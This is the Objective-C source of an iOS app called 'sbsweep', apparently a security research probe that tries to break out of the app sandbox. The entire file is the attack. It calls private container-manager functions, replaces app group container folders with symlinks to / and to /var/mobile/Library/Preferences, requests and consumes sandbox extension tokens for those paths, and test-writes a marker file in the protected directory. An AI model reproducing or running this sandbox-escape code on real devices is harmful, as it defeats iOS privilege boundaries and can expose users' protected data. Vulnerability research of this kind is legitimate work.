// sbsweep — MCM part sweep: issue tokens for symlinked Documents/Library/Caches
// parts of the app group container, targeting / or a protected path.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbsweep] %@", s);
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail"); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    for (NSString *gid in ids) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) return gid;
    }
    return nil;
}

static void check(NSString *tag) {
    NSString *p = @"/var/mobile/Library/Preferences";
    errno = 0;
    DIR *d = opendir(p.fileSystemRepresentation);
    L(@"[%@] opendir prefs=%p errno=%d", tag, d, errno);
    if (d) closedir(d);
    NSString *m = [p stringByAppendingPathComponent:@"sbsweep_marker"];
    errno = 0;
    int fd = open(m.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    L(@"[%@] write prefs fd=%d errno=%d", tag, fd, errno);
    if (fd >= 0) { write(fd, "x", 1); close(fd); unlink(m.fileSystemRepresentation); }
}

static char *query(NSString *gid, uint64_t cls, uint64_t part, uint64_t flags, NSString **pathOut) {
    void *q = q_create();
    q_class(q, cls);
    void *x = xpc_string ? xpc_string(gid.UTF8String) : NULL;
    q_ids(q, x);
    q_part(q, part);
    q_flags(q, flags);
    void *res = q_get(q);
    const char *p = NULL;
    char *tok = (res && q_token) ? q_token(res) : NULL;
    L(@"q cls=%llu part=%llu flags=0x%llx res=%p tok=%s", (unsigned long long)cls,
      (unsigned long long)part, (unsigned long long)flags, res, tok ? "YES" : "NO");
    if (tok) L(@"token=%s", tok);
    if (pathOut) *pathOut = p ? [NSString stringWithUTF8String:p] : nil;
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    return tok;
}

static void testPart(NSString *gid, uint64_t part, NSString *target) {
    NSString *root = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid].path;
    NSString *path = nil;
    if (part == 1) path = [root stringByAppendingPathComponent:@"Documents"];
    else if (part == 2) path = [root stringByAppendingPathComponent:@"Library"];
    else if (part == 3) path = [root stringByAppendingPathComponent:@"Library/Caches"];
    else if (part == 4) path = [root stringByAppendingPathComponent:@"tmp"];
    else return;
    NSString *bak = [path stringByAppendingString:@".sweepbak"];
    NSFileManager *fm = [NSFileManager defaultManager];
    struct stat st;
    if (lstat(bak.fileSystemRepresentation, &st) == 0) {
        L(@"part %llu stale backup, skip", (unsigned long long)part);
        return;
    }
    L(@"--- part %llu path=%@ target=%@", (unsigned long long)part, path, target);
    if ([fm fileExistsAtPath:path]) {
        if (rename(path.fileSystemRepresentation, bak.fileSystemRepresentation) != 0) {
            L(@"part %llu rename failed errno=%d", (unsigned long long)part, errno);
            return;
        }
    }
    [fm createDirectoryAtPath:[path stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
    unlink(path.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, path.fileSystemRepresentation) != 0) {
        L(@"part %llu symlink failed errno=%d", (unsigned long long)part, errno);
        goto restore;
    }
    for (uint64_t f = 0; f < 2; f++) {
        uint64_t flags = f ? 0x8100000000ULL : 0x8000000000ULL;
        NSString *p = nil;
        char *tok = query(gid, 7, part, flags, &p);
        if (tok) {
            int64_t h = s_consume(tok);
            L(@"part %llu consume=%lld", (unsigned long long)part, (long long)h);
            check([NSString stringWithFormat:@"part%llu-f%llu", (unsigned long long)part, (unsigned long long)f]);
            if (h >= 0) s_release(h);
            free(tok);
        }
    }
restore:
    unlink(path.fileSystemRepresentation);
    if ([fm fileExistsAtPath:bak]) {
        rename(bak.fileSystemRepresentation, path.fileSystemRepresentation);
    } else {
        [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
    }
    L(@"--- part %llu done", (unsigned long long)part);
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbsweep start pid=%d", getpid());
        if (!load()) return;
        NSString *gid = findGroup();
        if (!gid) return;
        check(@"before");
        NSArray<NSString *> *targets = @[@"/", @"/var/mobile/Library/Preferences"];
        for (NSString *t in targets) {
            for (uint64_t part = 1; part <= 4; part++) {
                testPart(gid, part, t);
            }
        }
        L(@"=== sbsweep done ===");
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbsweep"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
